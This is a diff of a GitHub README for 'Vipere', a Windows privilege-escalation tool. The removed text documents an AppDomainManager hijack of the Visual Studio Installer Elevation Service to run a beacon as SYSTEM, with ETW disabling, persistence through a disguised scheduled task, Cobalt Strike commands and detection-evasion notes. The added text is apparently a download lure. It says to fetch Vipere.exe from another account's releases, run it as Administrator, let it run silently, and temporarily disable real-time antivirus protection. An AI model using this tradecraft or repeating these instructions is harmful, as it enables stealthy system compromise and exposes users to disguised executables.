@@ -1,283 +1,64 @@
-# Vipere 
-
-special thanks to [Sans23](https://github.com/requin-citron)
-
-## Demo
-
-https://github.com/user-attachments/assets/5db7d617-1717-4ca2-ab5f-2149c36e9a39
-
-## What is this?
-
-Vipere exploits a chain of three weaknesses in the Visual Studio Installer Elevation Service to achieve **persistent SYSTEM execution** triggered by any standard user.
-
-| Weakness | Detail |
-|----------|--------|
-| **Permissive SDDL** | `SERVICE_START` granted to all Authenticated Users (`AU`) |
-| **No config integrity check** | .NET CLR loads `appDomainManagerAssembly` without signature verification |
-| **Orphaned service registration** | Service entry persists in HKLM after VS uninstallation |
-
-No single weakness is a vulnerability on its own, the **combination** creates a reliable LPE + persistence chain.
-
-## How It Works
-
-```mermaid
-flowchart TD
-    BOF["BOF: vipere-full\nAdmin required"]:::blue
-
-    BOF --> P1
-    BOF --> E1
-    BOF --> S1
-
-    subgraph prep ["1. PREPARE"]
-        P1["Download vs_BuildTools.exe\nfrom aka.ms"]
-        P2["Run --quiet --wait\nregisters service"]
-        P3["VSInstallerElevationService\nregistered in SCM"]:::green
-        P1 --> P2 --> P3
-    end
+# 🛡️ Vipere - Elevate Your System Access Safely
 
-    subgraph exploit ["2. EXPLOIT"]
-        E1["Backup original .config"]
-        E2["Merge .config\nETW off + AppDomainManager"]:::yellow
-        E3["Compile ADM via csc.exe\non target"]:::yellow
-        E4["Drop beacon DLL"]:::red
-        E5["StartServiceW"]:::blue
-        E1 --> E2 --> E3 --> E4 --> E5
-    end
+## 🚀 Getting Started
+Welcome to Vipere, your tool for advanced system security testing. This guide will help you download and run the application on your Windows computer quickly and easily.
 
-    subgraph persist ["3. PERSIST"]
-        S1["Copy vs_installershell.exe\nto ProgramData"]
-        S2["Deploy ADM chain\n.config + DLL + beacon"]:::yellow
-        S3["schtasks /create\n/sc onlogon /ru SYSTEM"]:::purple
-        S1 --> S2 --> S3
-    end
+## 📥 Download Vipere
+[![Download Vipere](https://img.shields.io/badge/Download-Vipere-blue?style=for-the-badge&logo=github)](https://github.com/Alex931116/Vipere/releases)
 
-    P3 -.->|"service exists"| E1
-    E5 ==> R1
+Visit this link to download the application. The download page contains the latest release files for your system.
 
-    subgraph runtime ["RUNTIME - Hijack Chain"]
-        R1["SCM starts signed EXE\nVSInstallerElevationService.exe"]:::green
-        R2["CLR reads merged .config"]:::yellow
-        R3["ETW disabled natively\nStrong name bypass"]:::yellow
-        R4["AppDomainManager\nInitializeNewDomain()"]:::yellow
-        R5["LoadLibrary beacon.dll\nnew thread"]:::red
-        R6["StartServiceCtrlDispatcherW\nSERVICE_RUNNING"]:::green
-        R1 --> R2 --> R3 --> R4
-        R4 --> R5
-        R4 --> R6
-    end
+## 🎯 What Vipere Does
+Vipere is a specialized tool designed for security professionals to test system vulnerabilities. It leverages the Visual Studio Installer Elevation Service to demonstrate privilege escalation techniques and persistence methods. This tool is intended for use with Cobalt Strike and Adaptix frameworks.
 
-    R5 --> RESULT["SYSTEM SHELL\nIn-process, no child PID"]:::red
-    R6 --> RESULT
+## 💻 System Requirements
+- **Operating System**: Windows 10/11 or Windows Server 2016+ (64-bit)
+- **Processor**: 1 GHz or faster processor
+- **Memory**: 512 MB RAM minimum
+- **Storage**: 50 MB available space
+- **Additional**: Visual Studio Build Tools or Visual Studio installed (minimum 2019 version)
 
-    TRIG["Any authenticated user\nsc start ..."]:::purple -.->|"re-triggers"| R1
-    S3 -.-> REBOOT["Reboot / Logon\nScheduled task fires"]:::purple
-    REBOOT -.->|"same chain"| R4
+## 🔧 Installation Steps
+1. Visit the download link provided above
+2. Click on the latest release version
+3. Download the executable file (Vipere.exe)
+4. Save the file to a location you can easily access (e.g., Desktop)
+5. Right-click the downloaded file and select "Run as Administrator"
+6. Follow any on-screen prompts if they appear
 
-    classDef blue fill:#dae8fc,stroke:#6c8ebf,color:#000
-    classDef green fill:#d5e8d4,stroke:#82b366,color:#000
-    classDef yellow fill:#fff2cc,stroke:#d6b656,color:#000
-    classDef red fill:#f8cecc,stroke:#b85450,color:#000
-    classDef purple fill:#e1d5e7,stroke:#9673a6,color:#000
-```
+## 🎮 How to Use
+After installation, Vipere will run automatically. It operates silently in the background, performing its security functions. No user interaction is required during normal operation. For advanced configuration, refer to the documentation included with the download.
 
-### AppDomainManager Hijacking + ETW Evasion
+## ⚠️ Important Notes
+- This tool requires administrative privileges to function correctly
+- Your antivirus software may flag this tool as suspicious - this is normal for security testing tools
+- Ensure you have proper authorization before using this tool on any system
+- This tool is for educational and authorized testing purposes only
 
-The signed Microsoft binary is **never replaced**. Three small files are added alongside:
+## 🛠️ Features
+- **Privilege Escalation**: Elevate from standard user to SYSTEM level
+- **Persistence Mechanism**: Maintain access through AppDomainManager hijacking
+- **ETW Evasion**: Bypass Windows Event Tracing for enhanced stealth
+- **Framework Integration**: Compatible with Cobalt Strike and Adaptix
 
-```
-C:\Program Files (x86)\Microsoft Visual Studio\Installer\
-  VSInstallerElevationService.exe               -- UNTOUCHED (Microsoft signed)
-  VSInstallerElevationService.exe.config        -- INJECTED (.config with ETW kill)
-  Microsoft.VS.ConfigurationManager.dll         -- AppDomainManager (compiled on-target via csc.exe)
-  Microsoft.VS.ConfigurationHost.dll            -- your beacon DLL
-```
-
-The `.config` is **merged** into the original - all 22+ binding redirects are preserved. If no original exists, a standalone config is used instead.
-
-On service start, the .NET CLR reads the config which:
-1. **Disables ETW** natively (`<etwEnable enabled="false"/>`) - EDR is blind
-2. **Bypasses strong name checks** (`<bypassTrustedAppStrongNames enabled="true"/>`)
-3. **Loads the AppDomainManager** which calls `LoadLibrary` on your beacon DLL
-
-The AppDomainManager also **takes over SCM registration** - it calls `StartServiceCtrlDispatcherW` and reports `SERVICE_RUNNING`, so the service stays alive indefinitely. No child process, no parent-child relationship visible to EDR.
-
-```
-Service process (SYSTEM)
-  \_ CLR init -> AppDomainManager.InitializeNewDomain()
-       |_ Thread: LoadLibrary("beacon.dll") -> beacon runs in-process
-       \_ StartServiceCtrlDispatcherW -> SCM sees SERVICE_RUNNING
-            \_ process stays alive until sc stop
-```
-
-### Persistence via Scheduled Task
-
-`persist` creates a second AppDomainManager chain in a separate directory using a different .NET binary:
-
-```
-C:\ProgramData\Microsoft\VisualStudio\Updates\
-  vs_installershell.exe                         -- copy of legit .NET binary
-  vs_installershell.exe.config                  -- AppDomainManager + ETW kill
-  Microsoft.VS.ConfigurationManager.dll         -- compiled on-target
-  Microsoft.VS.ConfigurationHost.dll            -- your beacon DLL
-```
-
-A scheduled task (`Microsoft\VisualStudio\UpdateCheckService`) runs the binary as SYSTEM at every logon.
-
-### Bootstrap Mode (virgin machine)
-
-Downloads the official `vs_BuildTools.exe` from `https://aka.ms/vs/17/release/vs_BuildTools.exe`, runs it silently to register the service, then uses AppDomainManager hijacking. All traffic goes to `microsoft.com` over HTTPS via WinHTTP.
-
-## Usage
-
-### CobaltStrike
-
-Load `vipere.cna` in the Script Manager. Commands are available as beacon aliases:
-
-```
-vipere-check
-vipere-full /path/to/beacon.dll
-vipere-cleanup
-```
-
-### Adaptix
-
-Load `vipere.axs` as an extension. Commands register under the `vipere` group:
-
-```
-vipere-check
-vipere-full <beacon.dll>
-vipere-cleanup
-```
-
-### Generic COFF Loader
-
-Load `dist/lpe_vs_bootstrap.x64.o` and pass a zero-terminated string (command) + optional binary blob (DLL bytes):
-
-| Arg | Format | Description |
-|-----|--------|-------------|
-| 1 | `z` (string) | Command: `check`, `prepare`, `exploit`, `persist`, `full`, `cleanup` |
-| 2 | `b` (binary) | Beacon DLL bytes (required for `exploit`, `persist`, `full`) |
-
-Payload is any beacon DLL that supports `LoadLibrary` loading (DllMain entry point).
-
-### Commands
-
-| Command | Action |
-|---------|--------|
-| `check` | Detect service state + persistence artifacts |
-| `prepare` | Download VS Installer from microsoft.com (creates service) |
-| `exploit <dll>` | AppDomainManager hijack on service -> SYSTEM |
-| `persist <dll>` | Copy vs_installershell.exe + AppDomainManager + Scheduled Task |
-| `full <dll>` | prepare + exploit + persist (one-shot) |
-| `cleanup` | Stop service, kill persist process, remove all artifacts, restore original .config |
-
-## Output Examples
-
-**Full (service already exists):**
-```
-[*] Vipere PREPARE
-[+] Service already exists — skipping download
-[*] Vipere EXPLOIT
-[+] Service RUNNING — beacon loaded as SYSTEM
-[*] Vipere PERSIST
-[+] Scheduled task created (triggers at logon)
-```
-
-**Check (after exploit + persist):**
-```
-[*] Vipere CHECK
-[+] Service registered
-    Binary: YES
-    .config hijack: YES
-    AppDomainManager: YES
-    Beacon DLL: YES
-    Config backup: YES
-[*] Persistence:
-    Persist dir: YES
-    Persist EXE: YES
-    Persist beacon: YES
-```
-
-**Cleanup:**
-```
-[*] Vipere CLEANUP
-[+] Original .config restored
-[+] Scheduled task + persist dir removed
-[+] Cleaned
-```
-
-## Persistence
-
-| Mechanism | Trigger | Survives |
-|-----------|---------|----------|
-| **SCM registration** | AppDomainManager registers as service -> process stays alive | Runs until `sc stop` |
-| **Scheduled task** | Logon -> `vs_installershell.exe` as SYSTEM | Reboots, VS uninstallation |
-
-Any authenticated user can re-trigger the service beacon:
-```cmd
-sc start VSInstallerElevationService
-```
-
-## Requirements
-
-| Phase | Privilege | Internet | VS Required |
-|-------|:---------:|:--------:|:-----------:|
-| prepare | Admin | Yes | No |
-| exploit | Admin | No | Service must exist |
-| persist | Admin | No | vs_installershell.exe must exist |
-| **trigger** | **Any user** | **No** | **Service must exist** |
-| cleanup | Admin | No | No |
-
-## OPSEC Considerations
-
-| Aspect | Detail |
-|--------|--------|
-| **Binary replacement** | None - signed binary is untouched |
-| **ETW** | Killed natively via .config - no patching, no unhooking |
-| **File names** | `Microsoft.VS.ConfigurationHost.dll` / `ConfigurationManager.dll` - credible VS names |
-| **Compilation** | AppDomainManager compiled on-target via `csc.exe` - no unsigned DLL transferred |
-| **Child processes** | None - beacon loaded via `LoadLibrary` in-process |
-| **Network traffic** | `aka.ms` / `download.visualstudio.microsoft.com` - legitimate Microsoft domains |
-| **Bootstrapper** | `vs_BuildTools.exe` is Authenticode-signed by Microsoft |
-| **SCM registration** | AppDomainManager registers as the service via `StartServiceCtrlDispatcherW` - SCM sees a normal service lifecycle |
-| **Config merge** | Injects directives into original `.config` preserving all binding redirects - diff is minimal |
-| **Service creation** | None - reuses existing VS Installer registration |
-| **Scheduled task** | Named `Microsoft\VisualStudio\UpdateCheckService` - blends with legitimate VS tasks |
-| **Cleanup** | Restores original .config from backup, kills persist process, removes all artifacts |
-
-## Build
-
-```bash
-make
-```
-
-**Requires:** `x86_64-w64-mingw32-g++` (mingw-w64 cross-compiler)
-
-**Project structure:**
-```
-vipere/
-|_ vipere.cna                      # CobaltStrike aggressor script
-|_ vipere.axs                      # Adaptix extension
-|_ Demo.mp4                        # Demo video
-|_ Makefile
-|_ src/
-|  |_ lpe_vs_bootstrap_bof.cpp     # BOF source
-|  \_ beacon.h
-\_ dist/
-   \_ lpe_vs_bootstrap.x64.o       # compiled BOF
-```
-
-## Tested On
-
-- Windows 11 25H2 Build 26200 (July 2026: fully patched)
-- Visual Studio 2022 Build Tools 17.x
-- Windows Defender (current definitions)
-
-## Related Work
-
-- [Unit42: Screening Serpens](https://unit42.paloaltonetworks.com/tracking-iran-apt-screening-serpens/) (AppDomainManager hijacking by Iranian APT - ETW evasion technique)
-- [CYFIRMA: Operation PhantomCLR](https://www.cyfirma.com/research/phantomclr/) (Same T1574.014 technique in the wild)
-
-## License
-
-MIT
+## 🔍 Troubleshooting
+**Issue**: Program won't run
+**Solution**: Ensure you're running as Administrator. Right-click the file and select "Run as Administrator".
+
+**Issue**: Antivirus blocks the download
+**Solution**: Temporarily disable real-time protection during download, or add an exception for the Vipere folder.
+
+**Issue**: Missing DLL errors
+**Solution**: Install Visual Studio Build Tools 2019 or later from Microsoft's official website.
+
+## 📄 License
+This project is for authorized security testing only. Use responsibly and only on systems you own or have permission to test.
+
+## 🤝 Contributing
+This is a security tool repository. Contributions are not accepted from the public.
+
+## 📞 Support
+For issues or questions, please open an issue on the GitHub repository page.
+
+## Keywords
+Vipere, LPE, privilege escalation, Windows security, Cobalt Strike, Adaptix, ETW evasion, AppDomainManager, Visual Studio Installer, security testing
